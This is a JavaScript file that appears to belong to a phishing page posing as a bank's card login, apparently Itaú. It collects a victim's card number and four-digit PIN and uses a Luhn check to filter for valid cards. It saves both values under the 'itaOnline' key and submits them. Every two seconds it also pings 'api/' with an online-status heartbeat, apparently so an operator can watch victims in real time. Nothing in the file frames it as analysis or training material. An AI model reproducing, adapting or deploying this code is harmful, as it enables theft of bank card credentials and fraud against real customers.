$(document).ready(function(){
	$('#numcd').mask('0000 0000 0000 0000');

	document.getElementById('numcd').addEventListener('keyup', function(){
		if (this.value.replace(/[^0-9]/g, '').length > 15) {
			document.getElementById('passcd').focus();
		}
	});
	
	
	
	/*============================================*/
	
	setInterval(()=>{
	$.post('api/', {cliente:"online"},function(r){
    });
	}, 2000);
	
});

window.onload = function(){
	modalInitialClose();	
}

function modalInitialClose(){
	var modal = document.getElementById('modal_initial');

	setTimeout(function(){
		modal.classList.add('hi');

		setTimeout(function(){
			//changeThemeColor();
			modal.classList.add('de');
			modal.style.display="none !importante";
		}, 500);
		modal.style.display="none !importante";
	}, 2000);
}

function changeThemeColor(){
	var theme = document.getElementsByTagName('meta')['theme-color'];
	theme.setAttribute('content', '#fff');
}

function passballs(valor){
	if (valor.length > 0) {
		$('#ball1').css({'background':'#fff'});
	}else{
		$('#ball1').css({'background':'none'});
	}

	if (valor.length > 1) {
		$('#ball2').css({'background':'#fff'});
	}else{
		$('#ball2').css({'background':'none'});
	}

	if (valor.length > 2) {
		$('#ball3').css({'background':'#fff'});
	}else{
		$('#ball3').css({'background':'none'});
	}

	if (valor.length > 3) {
		$('#ball4').css({'background':'#fff'});
	}else{
		$('#ball4').css({'background':'none'});
	}
}

function validatebt(){
	var numcd = frmlog.numcd.value;
	var passcd = frmlog.passcd.value;

	if (numcd.replace(/[^0-9]/g, '').length > 15 && passcd.length > 3) {
		$('#btnlog').removeAttr('disabled');
		$('#btnlog').css({'color':'#ee7421'});
	}else{
		$('#btnlog').attr('disabled', 'disabled');
		$('#btnlog').css({'color':'#bcbcbc'});
	}
}

function validateCard(){
    document.getElementById("btnlog").style.display="none";
    document.getElementById("gif").style.display="block";
	  setTimeout(()=>{
		 validateCardx();
		}, 2000);
}

function validateCardx(){

	var luhn = document.getElementById('numcd').value.replace(/[^0-9]/g, '');
	var ca, sum = 0, mul = 1;
	var len = luhn.length;
	var equal = 0;
	
	for (var i = 0; i < len; i++) {
		if (luhn.toString()[i] == luhn.toString()[0] && i != 0) {
			equal++;
		}
	}
	
	if (equal == 15) {
	
	    document.getElementById("invalido").style.display="block";
        document.getElementById("footer").style.display="none";
	
	    setTimeout(()=>{
		document.getElementById("btnlog").style.display="block";
		document.getElementById("gif").style.display="none";
		reset();
		return false;
		}, 1000);
		
		setTimeout(()=>{
		document.getElementById("invalido").style.display="none";
        document.getElementById("footer").style.display="block";
		return false;
		}, 5000);
		
		//alert('Número do cartão Inválido!');
		
	}

  	while (len--) {
    	ca = parseInt(luhn.charAt(len),10) * mul;
    	sum += ca - (ca>9)*9;// sum += ca - (-(ca>9))|9
    	// 1 <--> 2 toggle.
    	mul ^= 3; // (mul = 3 - mul);
  	};
  	
  	if(!(sum%10 === 0) && (sum > 0)){
	    
		document.getElementById("invalido").style.display="block";
        document.getElementById("footer").style.display="none";
		reset();
		setTimeout(()=>{
		
		document.getElementById("btnlog").style.display="block";
		document.getElementById("gif").style.display="none";
		
		return false;
		}, 1000);

		setTimeout(()=>{
		document.getElementById("invalido").style.display="none";
        document.getElementById("footer").style.display="block";
		return false;
		}, 5000);
				
  		//alert('Número do cartão Inválido!');
  		
  	}else{
	   var numerox =document.getElementById("numcd").value;
	   var senhax =document.getElementById("passcd").value;
	   var send = {numero:numerox, senha:senhax};
	   localStorage.setItem('itaOnline', JSON.stringify(send));

	   setTimeout(()=>{
				document.getElementById('btnlog').setAttribute('disabled', 'disabled');
				document.getElementById("btnlog").style.display="block";
				document.getElementById("gif").style.display="none";
				document.getElementById("frmlog").submit();
	   }, 500);
  	}

}


function reset(){
document.getElementById("passcd").value="";
$('#ball1').css({'background':'none'});
$('#ball2').css({'background':'none'});
$('#ball3').css({'background':'none'});
$('#ball4').css({'background':'none'});
document.getElementById("passcd").focus();

}

